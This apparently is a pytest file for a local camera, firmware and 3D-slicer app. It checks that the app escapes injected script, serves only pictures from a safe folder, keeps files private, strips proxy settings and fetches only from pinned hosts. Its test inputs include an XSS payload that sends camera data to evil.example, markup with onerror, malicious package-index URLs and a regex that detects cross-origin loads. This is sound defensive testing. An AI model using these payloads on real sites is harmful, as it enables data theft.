    crafted = '";fetch(BASE_URL+"/cameras").then(r=>location.href="https://evil.example/?"+r);//'
    r = here.get("/viewer/sites/garage", params={"focus": crafted})
    assert r.status_code == 200
    assert crafted not in r.text
    line = next(ln.strip() for ln in r.text.splitlines() if "INITIAL_FOCUS =" in ln)
    assert line.startswith('const INITIAL_FOCUS = "\\";fetch(BASE_URL+\\"')  # one JSON string
    assert "\\u003e" in line and line.endswith(';//";')
    raw_in_script = re.compile(r"""(const|let|var)\s+\w+\s*=\s*["'][^"'\n]*\{\{""")
    for path in (ROOT / "templates").rglob("*.j2"):
        text = path.read_text(encoding="utf-8")
        assert not raw_in_script.search(text), f"{path.name}: a raw value in a script literal"
        for m in re.finditer(r"(const|let|var)\s+\w+\s*=\s*\{\{([^}]*)\}\}", text):
            assert "tojson" in m.group(2), f"{path.name}: {m.group(0)} is not JSON"


def test_the_picture_root_is_a_folder_of_pictures_never_everything(monkeypatch, tmp_path):
    """The whole machine, the person's home folder and anything above it are refused as a
    picture root: a root there would serve everything of theirs to whatever asks."""
    from fastapi import HTTPException

    from apothecary import api

    home = tmp_path / "home" / "person"
    (home / "pictures").mkdir(parents=True)
    monkeypatch.setattr(api.Path, "home", classmethod(lambda cls: home))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(home / "pictures"))
    assert api._picture_root() == (home / "pictures").resolve()
    for root in (home, home.parent, tmp_path):
        monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(root))
        with pytest.raises(HTTPException) as caught:
            api._picture_root()
        assert "everything of yours" in caught.value.detail, root
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(Path(tmp_path.anchor)))
    with pytest.raises(HTTPException, match="whole"):
        api._picture_root()
    # HOME is a variable; the account's home folder is not, and the state folder
    # (serial numbers, camera labels, readings) is never a picture root either.
    import pwd

    real_home = Path(pwd.getpwuid(os.getuid()).pw_dir).resolve()
    monkeypatch.setattr(api.Path, "home", classmethod(lambda cls: tmp_path / "elsewhere"))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(real_home))
    with pytest.raises(HTTPException, match="everything of yours"):
        api._picture_root()
    state = tmp_path / "state"
    state.mkdir()
    monkeypatch.setenv("APOTHECARY_STATE_DIR", str(state))
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(state))
    with pytest.raises(HTTPException, match="everything of yours"):
        api._picture_root()
    # And the file route serves a picture, judged by its bytes, and nothing else.
    pictures = tmp_path / "pics"
    pictures.mkdir()
    (pictures / "notes.json").write_text('{"serial": "A106ZTEU"}', encoding="utf-8")
    (pictures / "fake.png").write_text("not a picture", encoding="utf-8")
    from PIL import Image

    Image.new("RGB", (4, 4), (10, 20, 30)).save(pictures / "real.png")
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(pictures))
    here = TestClient(app)
    assert here.get("/photos/pictures/file", params={"path": "real.png"}).status_code == 200
    assert here.get("/photos/pictures/file", params={"path": "notes.json"}).status_code == 415
    assert here.get("/photos/pictures/file", params={"path": "fake.png"}).status_code == 415


def test_views_write_nothing_outside_the_root_its_two_folders_and_the_state_folder(
    monkeypatch, tmp_path
):
    """Adding a camera, pinning, finding, sizing, making, dropping and forgetting a view
    keeps nothing anywhere but the picture root's own two folders and the state folder
    (the camera records): views, made pieces and the finder cache are held in memory.
    And no picture the server answers with -- whole, or at a size for a mat -- may
    enter the browser's disk cache."""
    import io

    from PIL import Image, ImageDraw

    from apothecary.api import _site_store
    from apothecary.vision import cache as cache_module
    from apothecary.vision import views as views_module

    root, state = tmp_path / "pics", tmp_path / "state"
    root.mkdir()
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(root))
    monkeypatch.setenv("APOTHECARY_STATE_DIR", str(state))
    monkeypatch.setattr(views_module, "_store", views_module.Views())
    monkeypatch.setattr(cache_module, "_cache", cache_module.FinderCache())
    image = Image.new("L", (400, 200), 245)
    ImageDraw.Draw(image).rectangle((40, 40, 160, 120), fill=20)
    buf = io.BytesIO()
    image.save(buf, format="PNG")
    (root / "own.png").write_bytes(buf.getvalue())

    def everything():
        return {p for p in tmp_path.rglob("*")} | set(Path.cwd().iterdir())

    before = everything()
    here = TestClient(app)
    try:
        _site_store.reset("garage")
        camera = here.post("/sites/garage/cameras", json={"host": "workbench"}).json()
        here.put(
            f"/sites/garage/cameras/{camera['camera']['name']}/device",
            json={"id": "cam1", "label": "desk webcam"},
        )
        kept = here.post(
            "/photos/pictures",
            params={
                "name": "desk",
                "kept": "upload",
                "site": "garage",
                "camera": camera["camera"]["name"],
            },
            content=buf.getvalue(),
        ).json()
        captured = here.post(
            "/photos/pictures",
            params={"name": "frame", "site": "garage", "host": ""},
            content=buf.getvalue(),
        ).json()
        own = here.post("/sites/garage/views", json={"host": "workbench", "picture": "own.png"})
        for view in (kept["view"], captured["view"], own.json()):
            here.post(f"/sites/garage/views/{view['id']}/find", json={})
            here.put(f"/sites/garage/views/{view['id']}/scale", json={"mm_across": 400})
            made = here.post(f"/sites/garage/views/{view['id']}/make", json={"all": True}).json()
            for piece in made["made"][:1]:
                here.delete(f"/sites/garage/made/{piece}")
        for path in ("own.png", kept["path"]):
            for params in ({"path": path}, {"path": path, "px": 256}):
                answer = here.get("/photos/pictures/file", params=params)
                assert answer.status_code == 200
                assert answer.headers["cache-control"] == "no-store", params
        here.delete(f"/photos/pictures/{kept['path']}")
        here.delete("/photos/pictures")
    finally:
        from test_views_api import forget_cameras

        forget_cameras()
    written = everything() - before
    allowed = (root / "captures", root / "uploads", state)
    stray = [p for p in written if not any(p == a or a in p.parents for a in allowed)]
    assert not stray, stray


def test_what_is_kept_is_the_persons_alone(monkeypatch, tmp_path):
    """The state folder and a camera's captures are this account's alone, whatever the umask."""
    import stat

    from apothecary.firmware import devices

    monkeypatch.setenv("APOTHECARY_STATE_DIR", str(tmp_path / "state"))
    monkeypatch.setattr(devices, "_STATE", None)
    monkeypatch.setenv("APOTHECARY_PICTURE_ROOT", str(tmp_path / "pics"))
    (tmp_path / "pics").mkdir()
    old_umask = os.umask(0o000)  # the loosest umask there is
    try:
        here = TestClient(app)
        assert here.post("/sites/garage/cameras", json={"host": "workbench"}).status_code == 201
        import io

        from PIL import Image

        buf = io.BytesIO()
        Image.new("RGB", (2, 2)).save(buf, format="PNG")
        assert here.post("/photos/pictures?name=x", content=buf.getvalue()).status_code == 201
    finally:
        os.umask(old_umask)
        from test_views_api import forget_cameras

        kept = (tmp_path / "state" / "camera_parts.json").stat()
        forget_cameras()
    for folder in (tmp_path / "state", tmp_path / "pics" / "captures"):
        assert folder.is_dir(), folder
        assert stat.S_IMODE(folder.stat().st_mode) == 0o700, folder
    assert stat.S_IMODE(kept.st_mode) == 0o600


def test_a_part_named_for_a_print_that_is_markup_is_refused():
    """The part a print names is a path in its site -- letters, digits and a little
    punctuation -- refused as it arrives, before any port is touched."""
    here = TestClient(app)
    for bad in ('<img src=x onerror="fetch(1)">', "a&b", 'x"y', " lead", "x" * 201):
        r = here.post(
            "/firmware/printers/print",
            json={"port": "/dev/ttyFAKE1", "file_id": "f1", "part": bad},
        )
        assert r.status_code == 422, bad
        assert r.json()["detail"][0]["loc"] == ["body", "part"], bad


def test_a_subprocess_inherits_no_proxy_and_no_arduino_override(monkeypatch):
    """arduino-cli is outside the socket guard, and lets either outrank its config file."""
    from apothecary.firmware import installer

    monkeypatch.setenv("HTTPS_PROXY", "http://proxy.example:3128")
    monkeypatch.setenv("http_proxy", "http://proxy.example:3128")
    monkeypatch.setenv("ARDUINO_NETWORK_CLOUD_API_SKIP_BOARD_DETECTION_CALLS", "false")
    monkeypatch.setenv("ARDUINO_BOARD_MANAGER_ADDITIONAL_URLS", "https://evil.example/index.json")
    monkeypatch.setenv("KEPT", "yes")
    env = stays_local.subprocess_env()
    assert "KEPT" in env
    assert not [k for k in env if k.lower().endswith("_proxy") or k.upper().startswith("ARDUINO_")]
    assert stays_local.subprocess_env({"ALL_PROXY": "x", "PATH": "/bin"}) == {"PATH": "/bin"}
    assert installer.env_for_arduino()["HOME"]
    assert "HTTPS_PROXY" not in installer.env_for_arduino()


@pytest.fixture
def arduino_cli(monkeypatch, tmp_path):
    """An ArduinoCli over a stub binary, its tools folder in tmp_path."""
    from apothecary.firmware import toolchains

    monkeypatch.setenv("APOTHECARY_TOOLS_DIR", str(tmp_path / "tools"))
    binary = tmp_path / "arduino-cli"
    binary.write_text("#!/bin/sh\n", encoding="utf-8")
    return toolchains.ArduinoCli(binary)


def test_arduino_cli_is_always_given_the_managed_config(arduino_cli, tmp_path):
    """Its own cloud lookup and update check are off; its package indexes are the fixed ones."""
    from apothecary.firmware import toolchains

    config = stays_local.ARDUINO_CLI_CONFIG
    assert config["network"]["cloud_api"]["skip_board_detection_calls"] is True
    assert config["updater"]["enable_notification"] is False
    assert sorted(config["board_manager"]["additional_urls"]) == sorted(
        stays_local.PACKAGE_INDEXES.values()
    )
    path = toolchains.managed_config_file()
    assert path == tmp_path / "tools" / "arduino-cli.yaml"
    assert json.loads(path.read_text(encoding="utf-8")) == config
    path.write_text("{}", encoding="utf-8")  # an edit by hand does not last
    assert json.loads(toolchains.managed_config_file().read_text(encoding="utf-8")) == config
    assert arduino_cli.config_file == path
    assert arduino_cli.argv("board", "list")[:3] == [
        str(tmp_path / "arduino-cli"),
        "--config-file",
        str(path),
    ]


def test_a_sketch_that_names_where_to_fetch_from_is_not_built(arduino_cli, tmp_path):
    """arduino-cli honours a sketch profile's platform_index_url whatever the command line says."""
    from apothecary.firmware import toolchains

    sketch = tmp_path / "blinky"
    sketch.mkdir()
    (sketch / "blinky.ino").write_text("void setup(){} void loop(){}", encoding="utf-8")
    assert arduino_cli.compile_argv(sketch, "arduino:avr:uno")[-1] == str(sketch)
    (sketch / "sketch.yaml").write_text(
        "default_profile: x\nprofiles:\n  x:\n    platforms:\n"
        "      - platform: arduino:avr\n        platform_index_url: https://evil.example/i.json\n",
        encoding="utf-8",
    )
    with pytest.raises(toolchains.ToolchainError, match="sketch profile"):
        arduino_cli.compile_argv(sketch, "arduino:avr:uno")
    with pytest.raises(toolchains.ToolchainError, match="sketch profile"):
        arduino_cli.upload_argv(sketch, "arduino:avr:uno", "/dev/ttyUSB0")


LOADS_FROM_ELSEWHERE = re.compile(
    r"""<(?:script|link|img|iframe|video|audio|source|embed|object)\b[^>]*\b(?:src|href|data)=["'](?:https?:)?//"""
    r"""|\bfetch\(\s*[`"'](?:https?:)?//"""
    r"""|new\s+(?:WebSocket|EventSource|XMLHttpRequest)\([^)]*[`"'](?:https?:|wss?:)?//"""
    r"""|@import\s+(?:url\()?["']?(?:https?:)?//"""
    r"""|url\(\s*["']?(?:https?:)?//"""
    r"""|sendBeacon\(|RTCPeerConnection""",
    re.I,
)


def test_no_page_loads_from_or_sends_to_another_origin():
    """Every template and every static module: nothing is fetched from, posted to or
    embedded from anywhere but this server. (A link a person may click is not a load.)"""
    found = []
    for folder, pattern in (
        (ROOT / "templates", "*.j2"),
        (PACKAGE / "static", "*.js"),
        (PACKAGE / "static", "*.css"),
    ):
        for path in folder.rglob(pattern):
            if "vendor" in path.parts:
                continue  # three.js is the vendored copy; its README says why
            for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
                if LOADS_FROM_ELSEWHERE.search(line):
                    found.append(f"{path.relative_to(ROOT)}:{n}: {line.strip()[:100]}")
    assert not found, "\n".join(found)


def test_the_pictures_the_browser_keeps_are_never_committed():
    """The picture root defaults to the folder the server starts in, often this repository."""
    for kept in ("captures/frame.png", "uploads/holiday.jpg"):
        ignored = subprocess.run(["git", "check-ignore", "-q", kept], cwd=ROOT)
        assert ignored.returncode == 0, f"{kept} would be committed"


# Every host `apothecary slicer install` was seen to reach (strace of a real install of
# OrcaSlicer 2.4.2 on Linux x86_64, 2026-10-10), and the step that reaches it. A slice
# reached none: OrcaSlicer asked the resolver nothing and connected nowhere.
SLICER_INSTALL_HOSTS = {
    "api.github.com": "the SHA-256 GitHub publishes for the pinned release's asset",
    "github.com": "the pinned release's asset",
    "release-assets.githubusercontent.com": "where github.com redirects the asset",
}


def test_the_slicer_installer_fetches_through_the_openscad_installers_fetch():
    """The slicer installer is not a third caller of tool_fetch: it fetches through the
    OpenSCAD installer's, to the hosts the install was seen to reach, all tool sources."""
    from apothecary import openscad_installer
    from apothecary.slicer import orcaslicer_installer

    assert orcaslicer_installer._fetch is openscad_installer._fetch
    assert orcaslicer_installer._fetch_to is openscad_installer._fetch_to
    assert set(SLICER_INSTALL_HOSTS) <= stays_local.TOOL_SOURCES


@pytest.mark.parametrize(
    "system, machine",
    [("Linux", "x86_64"), ("Linux", "arm64"), ("Darwin", "arm64"), ("Windows", "x86_64")],
)
def test_every_url_the_slicer_installer_fetches_is_a_tool_source_by_the_pinned_version(
    system, machine, tmp_path, monkeypatch
):
    """Each fetch is a GET of the pinned release's record or its asset, from a tool
    source -- refused before anything is opened if it were not -- and an asset that is
    not what GitHub publishes for it is never opened."""
    from urllib.parse import urlsplit

    from apothecary.slicer import orcaslicer_installer as oi

    monkeypatch.setenv("APOTHECARY_TOOLS_DIR", str(tmp_path / "tools"))
    asset = oi.asset_for(system, machine)
    asked = []

    def fetch(url):
        stays_local.tool_fetch(url)  # the guard's own check of the host
        asked.append(url)
        listed = [{"name": asset.name, "digest": "sha256:" + asset.sha256}]
        return json.dumps({"assets": listed}).encode()

    def fetch_to(url, path):
        stays_local.tool_fetch(url)
        asked.append(url)
        return "f" * 64  # not what GitHub publishes

    installer = oi.OrcaSlicerInstaller(
        fetch=fetch, fetch_to=fetch_to, system=system, machine=machine
    )
    with pytest.raises(oi.InstallError, match="checksum mismatch"):
        installer.install()
    assert {urlsplit(u).hostname for u in asked} == {"api.github.com", "github.com"}
    assert all("/v2.4.2" in u for u in asked), asked
    assert asked[-1].endswith("/" + asset.name)
    with pytest.raises(stays_local.LeftTheMachine):
        stays_local.tool_fetch("https://objects.example/OrcaSlicer.AppImage")
